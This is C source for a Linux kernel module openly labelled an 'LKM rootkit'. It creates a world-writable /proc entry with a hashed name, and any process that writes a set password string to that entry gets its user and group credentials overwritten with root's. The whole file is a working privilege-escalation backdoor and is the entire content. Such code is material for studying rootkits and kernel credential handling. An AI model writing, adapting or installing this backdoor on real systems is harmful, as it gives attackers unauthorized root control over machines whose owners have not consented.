#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("w3w3w3");
MODULE_DESCRIPTION("LKM rootkit");
MODULE_VERSION("0.0.1");

// INFO: $ printf rootme | sha512sum
# define NAME "4b96c64ca2ddac7d50fd33bc75028c9462dfbea446f51e192b39011d984bc8809218e3907d48ffc2ddd2cce2a90a877a0e446f028926a828a5d47d72510eebc0"
// INFO: $ printf r00tme | sha512sum
# define AUTH "05340126a6ae3257933cd7254aeaac2226ab164dc864fffc9953f01134b29f6b1c418d45570d112fba7b5bf831f52bd14071949e2add979e903113618b0e5584"

struct proc_dir_entry *entry;

ssize_t write_handler(struct file * filp, const char __user *buff, size_t count, loff_t *offp);

struct file_operations proc_fops = {
    .write = write_handler
};

ssize_t write_handler(struct file * filp, const char __user *buff, size_t count, loff_t *offp)
{
    char *kbuff;
    struct cred* cred;

    kbuff = kmalloc(count + 1, GFP_KERNEL);
    if (!kbuff) {
        return -ENOMEM;
    }

    if (copy_from_user(kbuff, buff, count)) {
        kfree(kbuff);
        return -EFAULT;
    }
    kbuff[count] = (char)0;

    if (strlen(kbuff) == strlen(AUTH) &&
        strncmp(AUTH, kbuff, count) == 0) {

        printk(KERN_INFO "Comrade, I will help you.\n");
        cred = (struct cred *)__task_cred(current);
        cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
        cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        printk(KERN_INFO "See you!\n");
    } else {
        printk("Alien, get out of here: %s.\n", kbuff);
    }

    kfree(kbuff);
    return count;
}

void backdoor(void) {
    entry = proc_create(NAME, S_IRUGO | S_IWUGO, NULL, &proc_fops);
}

void cleanbackdoor(void) {
    proc_remove(entry);
}

static int __init mode_init(void) {
    printk(KERN_INFO "Rootkit is entering.\n");
    backdoor();
    return 0;
}

static void __exit mode_exit(void) {
    cleanbackdoor();
    printk(KERN_INFO "Rootkit is leaving.\n");
}

module_init(mode_init);
module_exit(mode_exit);